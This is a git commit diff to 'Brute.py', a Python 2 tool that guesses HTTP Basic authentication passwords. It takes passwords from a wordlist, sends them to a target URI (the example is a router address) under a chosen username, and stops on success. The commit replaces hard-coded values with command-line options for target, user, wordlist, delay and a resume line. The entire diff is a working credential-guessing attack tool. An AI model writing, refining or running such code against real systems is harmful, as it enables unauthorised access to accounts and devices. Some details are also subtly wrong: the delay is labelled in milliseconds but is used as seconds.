559932e01c3fb9a81fa97734cd9bff65d5954456
William Davis <william.j.davis5@gmail.com>
2016-01-01 15:28:42 -0500

    updated ignore and brute py with argparse

--- Brute.py
+++ Brute.py
@@ -4,20 +4,23 @@ import sys
 import argparse
 
 parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
-parser.add_argument('Target', metavar='T', type=str, help='The target URI. ex http://192.168.1.1')
-parser.add_argument('Wordlist', metavar='W', type=str, help='The wordlist to choose passwords from')
-parser.add_argument('Username', metavar='U', type=str, help='The username to use')
-parser.add_argument('Delay', metavar='D', type=int, help='Time in milliseconds between each request', default=5)
+parser.add_argument('Target', metavar='--target', type=str, help='The target URI. ex http://192.168.1.1')
+parser.add_argument('Wordlist', metavar='--words', type=str, help='The wordlist to choose passwords from')
+parser.add_argument('Username', metavar='--user', type=str, help='The username to use')
+parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)
+parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)
 
-if not sys.argv[1:]:
-    print "Please provide word list"
-    exit()
-if sys.argv[2:]:
-    startAt = int(sys.argv[2])
+args = parser.parse_args()
+
+delay = args.delay
+target = args.Target
+username = args.Username
+wordlist = args.Wordlist
+startAt = args.startat
 count = 0
-with open(sys.argv[1], "r") as f:
+with open(wordlist, "r") as f:
     pwd = f.readline().strip('\n')
-    if 'startAt' in vars() or 'startAt' in globals():
+    if startAt > 0:
         print "Skipping: " + str(startAt)
         while count <= startAt:
             pwd = f.readline().strip('\n')
@@ -25,11 +28,12 @@ with open(sys.argv[1], "r") as f:
     while pwd:
         print pwd
         http = httplib2.Http()
-        http.add_credentials("admin", pwd)
-        res, content = http.request("http://192.168.1.1")
+        http.add_credentials(username, pwd)
+        res, content = http.request(target)
         print res.status
-        if (res.status == 200): exit()
+        if res.status == 200:
+            exit()
         pwd = f.readline().strip('\n').strip('')
         while not pwd:
             pwd = f.readline().strip('\n')
-        sleep(0.05)
+        sleep(delay)
